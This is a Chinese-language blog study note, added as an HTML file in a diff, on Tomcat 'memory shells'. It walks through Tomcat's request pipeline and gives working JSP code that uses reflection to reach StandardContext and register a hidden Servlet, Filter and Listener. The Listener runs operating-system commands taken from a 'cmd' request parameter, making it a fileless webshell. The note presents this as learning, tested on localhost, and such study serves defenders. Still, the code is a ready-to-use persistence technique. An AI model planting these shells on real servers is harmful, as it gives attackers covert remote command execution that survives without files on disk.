@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/favicon.ico >
+    <title>
+        Dawn Nine学习笔记
+    </title>
+    <meta name="description" content=  >
+    <meta name="keywords" content= Dawn Nine,代码学习 >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            内存马
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h1><blockquote>
+<p>内存马的目标：访问特定url，带上命令执行参数，让服务器返回命令执行结果。</p>
+</blockquote>
+<h3 id="请求流程梳理"><a href="#请求流程梳理" class="headerlink" title="请求流程梳理"></a>请求流程梳理</h3><blockquote>
+<p>标准流程：浏览器 → HTTP请求 → Web服务器（Tomcat）→ Servlet → Service → DAO → 数据库 </p>
+</blockquote>
+<p>如果我们想把下面这段的代码加入到正在运行的Servlet 容器，并在web.xml中自定义url，由于tomcat是懒加载，只有调用了该路由才会加载路由的相关信息，根据这个机制我们可以动态的加入路由并且使其执行我们的代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeverCmd</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        resp.getWriter().println(<span class="string">&quot;SeverCmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;--&gt;web.xml&lt;/--&gt;  </span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>SeverCmd<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.demo.SeverCmd<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>SeverCmd<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/cmd<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么当我们访问到这个页面，页面会先执行弹出计算器，再在页面上打印出SeverCmd。</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260111203421623.png" alt="image-20260111203421623"></p>
+<p>如果我们能够自己定义一段恶意java代码，并且让他能够跟正常的web.xml中一样进行执行。恶意的java代码可以通过任意文件上传来上传jsp文件（前提能够进行解析jsp文件），那么我们的目标就只剩如何把上传的代码的中的路由动态加到web.xml中。</p>
+<h3 id="Tomcat运行机制"><a href="#Tomcat运行机制" class="headerlink" title="Tomcat运行机制"></a>Tomcat运行机制</h3><p>细节可以看一下这个师傅的文章<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2441847">21张图解析Tomcat运行原理与架构全貌</a></p>
+<blockquote>
+<p>Tomcat标准工作流：<strong>Connector</strong>[EndPoint-&gt;Processor-&gt;Adapter] -&gt; <strong>Container</strong> [Engine-&gt;Host-&gt;Context-&gt;Wrapper]</p>
+</blockquote>
+<p>当 Tomcat 接收到一个 HTTP 请求时：</p>
+<ol>
+<li><strong>Connector</strong> 中的 <strong>Endpoint</strong> 接收 TCP 连接并分配 Socket；</li>
+<li><strong>Processor</strong> 解析 HTTP 协议，构建 Coyote 层的 <code>Request</code>&#x2F;<code>Response</code>；</li>
+<li><strong>CoyoteAdapter</strong> 将其转换为标准的 <code>HttpServletRequest</code>&#x2F;<code>Response</code>，并调用 <strong>Container</strong> 的处理链；</li>
+<li><strong>Engine</strong> 使用内部 <strong>Mapper</strong> 组件，根据请求的 <code>Host</code> 头匹配到对应的 <strong>Host</strong>；</li>
+<li><strong>Mapper</strong> 继续根据 URI 路径（如 <code>/app/user</code>）匹配到具体的 <strong>Context</strong>（Web 应用）；</li>
+<li><strong>Context</strong>的映射规则进一步匹配到目标 <strong>Wrapper</strong>（即 Servlet）；</li>
+<li>容器依次执行配置的 <strong>Filter 链</strong>，最终调用 <strong>Servlet.service()</strong> 执行业务逻辑；</li>
+<li>响应经原路返回给客户端。</li>
+</ol>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/dd5010c5dcbb5d441e2a95398837debf.png" alt="img"></p>
+<h3 id="Servlet内存马目标实现"><a href="#Servlet内存马目标实现" class="headerlink" title="Servlet内存马目标实现"></a>Servlet内存马目标实现</h3><p>通过这个执行流程，我们知道他在第6步的时候Context匹配目标 Wrapper，现在需要找context的映射怎么来的，具体操作看<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1HaGPzcENy/?p=2&share_source=copy_web&vd_source=9cea2ee0a8625e7f0de0386824e9f605">零溢出</a>这位师傅的视频定位到了org.apache.catalina.startup#ContextConfig类中的configureContext方法，这个方法是来处置读取web.xml中servlets对应具体执行的对象名称，servletMappings对应路由匹配。</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260112153831747.png" alt="image-20260112153831747"></p>
+<p>Wrapper中添加到Context层的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="built_in">this</span>.context.createWrapper();</span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String, String&gt; params = servlet.getParameterMap();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(Map.Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter((String)entry.getKey(), (String)entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(SecurityRoleRef roleRef : servlet.getSecurityRoleRefs()) &#123;</span><br><span class="line">                wrapper.addSecurityReference(roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">            <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (multipartdef.getMaxFileSize() != <span class="literal">null</span> &amp;&amp; multipartdef.getMaxRequestSize() != <span class="literal">null</span> &amp;&amp; multipartdef.getFileSizeThreshold() != <span class="literal">null</span>) &#123;</span><br><span class="line">                    wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(multipartdef.getLocation(), Long.parseLong(multipartdef.getMaxFileSize()), Long.parseLong(multipartdef.getMaxRequestSize()), Integer.parseInt(multipartdef.getFileSizeThreshold())));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(multipartdef.getLocation()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setAsyncSupported(servlet.getAsyncSupported());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">            <span class="built_in">this</span>.context.addChild(wrapper);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>映射Wrapper中添加到Context层</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Map.Entry&lt;String, String&gt; entry : webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">    <span class="built_in">this</span>.context.addServletMappingDecoded((String)entry.getKey(), (String)entry.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>context.addChild()添加代码到context和context.addServletMappingDecoded()添加映射到context中。现在目标明确了，需要获取到context这个变量调用上面这两个方法。当我们可以上传一个jsp代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">// 定义一个恶意servlet</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">           Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 从request中获取servletContext</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从servletContext中获取applicationContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line">    <span class="comment">// 从applicationContext中获取standardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从context获取Wrapper对象</span></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将自己的Servlet封装进wrapper对象</span></span><br><span class="line">    wrapper.setName(<span class="string">&quot;memshell&quot;</span>);</span><br><span class="line">    wrapper.setServletClass(ShellServlet.class.getName());</span><br><span class="line">    wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">ShellServlet</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将wrapper添加到上下文并设置映射路径</span></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/memshell&quot;</span>, <span class="string">&quot;memshell&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260112172255562.png" alt="image-20260112172255562"></p>
+<p>创建一个jsp文件，没有动态注册前<a target="_blank" rel="noopener" href="http://localhost:8080/memshell">http://localhost:8080/memshell</a></p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260112172344388.png" alt="image-20260112172344388"></p>
+<p>访问ShellServlet.jsp文件再次访问memshell</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260112172456215.png" alt="image-20260112172456215"></p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260112172522502.png" alt="image-20260112172522502"></p>
+<p>如果再次访问ShellServlet.jsp会怎么样，因为已经注册过了memshell路由报错。</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260112172624497.png" alt="image-20260112172624497"></p>
+<h3 id="Filter内存马目标实现"><a href="#Filter内存马目标实现" class="headerlink" title="Filter内存马目标实现"></a>Filter内存马目标实现</h3><p>首先自定义一个Filter类，看一下这个Filter类是如何加载到tomcat里面。</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260122152914312.png" alt="image-20260122152914312"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//配置xml文件</span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>HelloFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.demo.HelloFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>HelloFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>断点分析，会先走向<strong>ApplicationFilterChain.doFilter</strong>，流程总要走到internalDoFilter()函数，</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260122154413807.png" alt="image-20260122154413807"></p>
+<p>其中internalDoFilter()函数中，有filters数组，数组中有我们刚才定义的filter拦截器，internalDoFilter函数在193行循环调用doFilter来执行不同的filter。</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260122155949111.png" alt="image-20260122155949111"></p>
+<p>filters的数组是addFilter来赋值</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260122160357751.png" alt="image-20260122160357751"></p>
+<p>addFilter函数是ApplicationFilterFactory.createFilterChain()调用createFilterChain()函数是创建过滤器链，并进行初始化。</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260122160934352.png" alt="image-20260122160934352"></p>
+<p>通过分析堆栈发现是StandardWrapperValve.invoke函数调用。</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260122161423195.png" alt="image-20260122161423195"></p>
+<p>了解完整个调用流程，filter的关键在ApplicationFilterFactory.createFilterChain()中，这个函数是进行创建并初始化整体链，filter的数据是从filterMaps中获取 ，往下走会有一个for循环来进行添加过滤链中的数值，其中filterConfig的值不能为空否则跳过本次添加，filterConfig值为filterMaps.filterName。filtermaps他必须有一个值为name。</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260123095221956.png" alt="image-20260123095221956"></p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260123095516143.png" alt="image-20260123095516143"></p>
+<p>分析代码需要动态添加加入两个参数一个是filterMaps一个是filterConfig，filterMaps里面参数重点是urlPatterns和FilterName。filterConfig参数重点是filter和filterDef。</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260123103848314.png" alt="image-20260123103848314"></p>
+<p>ContextConfig.configureContext的方法设置的filterDef和 filterMaps，缺少初始化filterConfig</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260123105853613.png" alt="image-20260123105853613"></p>
+<p>在StandardContext.filterStart方法中进行了初始化，调用即可。</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260123110219394.png" alt="image-20260123110219394"></p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--从ServletContext中获取StandardContext--%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="comment">// 从request中获取servletContext</span></span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">  <span class="comment">// 从servletContext中获取applicationContext</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line">  <span class="comment">// 从applicationContext中获取standardContext</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%--动态注册恶意Filter--%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="comment">// 创建恶意Filter</span></span><br><span class="line">  <span class="type">ShellFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShellFilter</span>();</span><br><span class="line">  <span class="type">FilterDef</span> <span class="variable">def</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">  def.setFilter(filter);</span><br><span class="line">  def.setFilterName(<span class="string">&quot;filter-shell&quot;</span>);</span><br><span class="line">  def.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">  <span class="type">FilterMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">  map.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">  map.setFilterName(<span class="string">&quot;filter-shell&quot;</span>);</span><br><span class="line"></span><br><span class="line">  standardContext.addFilterDef(def);</span><br><span class="line">  standardContext.addFilterMapBefore(map);</span><br><span class="line">  standardContext.filterStart();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260123110605532.png" alt="image-20260123110605532"></p>
+<h3 id="Listener内存马目标实现"><a href="#Listener内存马目标实现" class="headerlink" title="Listener内存马目标实现"></a>Listener内存马目标实现</h3><p>首先分析Listener的作用它是对请求的url进行监听，通过代码进行断点分析。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package com.demo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletRequest;</span><br><span class="line">import javax.servlet.ServletRequestEvent;</span><br><span class="line">import javax.servlet.ServletRequestListener;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class HelloListener implements ServletRequestListener &#123;</span><br><span class="line">    public void requestInitialized(ServletRequestEvent sre) &#123;</span><br><span class="line">        ServletRequest req = sre.getServletRequest();</span><br><span class="line">        String cmd = req.getParameter(&quot;cmd&quot;);</span><br><span class="line">        if (cmd != null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                throw new RuntimeException(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现代码是StandardContext.fireRequestInitEvent()方法进行调用。</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260124204059944.png" alt="image-20260124204059944"></p>
+<p>所有的Listener是从instances数组中取出来的，listener.requestInitialized进行调用。</p>
+<p><img src="/2026/01/04/%E5%86%85%E5%AD%98%E9%A9%AC/image-20260124204142839.png" alt="image-20260124204142839"></p>
+<p>getApplicationEventListeners()方法是获取applicationEventListenersList私有变量中的值。直接反射加入到该私有变量中即可达到自定义Listener。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--从ServletContext中获取StandardContext--%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="comment">// 从request中获取servletContext</span></span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">  <span class="comment">// 从servletContext中获取applicationContext</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line">  <span class="comment">// 从applicationContext中获取standardContext</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%--动态注册恶意Listener--%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  standardContext.addApplicationEventListener(<span class="keyword">new</span> <span class="title class_">ListenerShell</span>());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>代码很大一部分参考了0ofo师傅，中间卡了很长一段时间的Filter马怎么动态加入分析，各个参数需要怎么构造，站在了巨人的肩膀上学习了一下，内存马学习的重点可能是tomcat的运行机制。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/0ofo/java-memshell">https://github.com/0ofo/java-memshell</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1N7chedEyX/?share_source=copy_web&vd_source=9cea2ee0a8625e7f0de0386824e9f605">https://www.bilibili.com/video/BV1N7chedEyX/?share_source=copy_web&amp;vd_source=9cea2ee0a8625e7f0de0386824e9f605</a></p>
+<p><a target="_blank" rel="noopener" href="https://curlysean.github.io/2025/03/20/Filter%E5%86%85%E5%AD%98%E9%A9%AC/#bXsSe">https://curlysean.github.io/2025/03/20/Filter%E5%86%85%E5%AD%98%E9%A9%AC/#bXsSe</a></p>
+</blockquote>
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
